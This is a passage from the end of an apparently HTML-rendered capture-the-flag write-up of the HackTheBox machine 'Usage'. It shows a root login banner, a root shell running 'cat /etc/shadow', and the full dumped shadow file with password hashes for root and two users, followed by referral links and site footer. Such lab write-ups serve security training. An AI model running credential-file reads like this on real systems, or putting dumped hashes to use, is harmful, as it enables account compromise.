class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">  System information as of Sun Apr 14 01:46:41 PM UTC 2024</span><br><span class="line"></span><br><span class="line">  System load:           0.31884765625</span><br><span class="line">  Usage of /:            70.9% of 6.53GB</span><br><span class="line">  Memory usage:          29%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             246</span><br><span class="line">  Users logged <span class="keyword">in</span>:       1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> eth0: 10.129.211.55</span><br><span class="line">  IPv6 address <span class="keyword">for</span> eth0: dead:beef::250:56ff:feb9:5028</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Expanded Security Maintenance <span class="keyword">for</span> Applications is not enabled.</span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line">Enable ESM Apps to receive additional future security updates.</span><br><span class="line">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Apr 14 13:38:00 2024 from 10.10.16.21</span><br><span class="line">root@usage:~<span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@usage:~<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$eHRVEjBacjX</span>.aL3Dv.ayh/<span class="variable">$ya7Anf39wpVrmChSihyT1sxtFg</span>.2JLtN/z5oNXKDRc4:19809:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19575:0:99999:7:::</span><br><span class="line">dash:$y$j9T<span class="variable">$vnXc5wuMp</span>/3C1Ao0PfIZS1<span class="variable">$bR</span>.rwyVqBNeMUHDNze/yT./JKQ.x9D4CsL3EqgMtkG6:19809:0:99999:7:::</span><br><span class="line">lxd:!:19575::::::</span><br><span class="line">mysql:!:19575:0:99999:7:::</span><br><span class="line">xander:$y$j9T$.0U.eu0EIIaUNyu7iFA1x/<span class="variable">$ScdmpKaag</span>.GHK3VFzdBCn19UT1eBLRCO7ghAvz7s0u0:19658:0:99999:7:::</span><br><span class="line">clamav:!:19593:0:99999:7:::</span><br><span class="line">_laurel:!:19815::::::</span><br></pre></td></tr></table></figure>
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you really like my writeups, please use this link to sign up for an HTB Academy account to show my appreciation.</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你真的喜歡我寫的writeup，請使用這個鏈接注冊一個 HTB Academy 賬號，以表達我的感謝。</a></p>
+<p>如果你是新手，使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>If you are a beginner, join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&text=HackTheBox - Machine - Usage"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&is_video=false&description=HackTheBox - Machine - Usage"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Usage&body=Check out this article: https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&title=HackTheBox - Machine - Usage"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&name=HackTheBox - Machine - Usage&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/04/14/2024-htb-machine/14-Usage/&t=HackTheBox - Machine - Usage"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
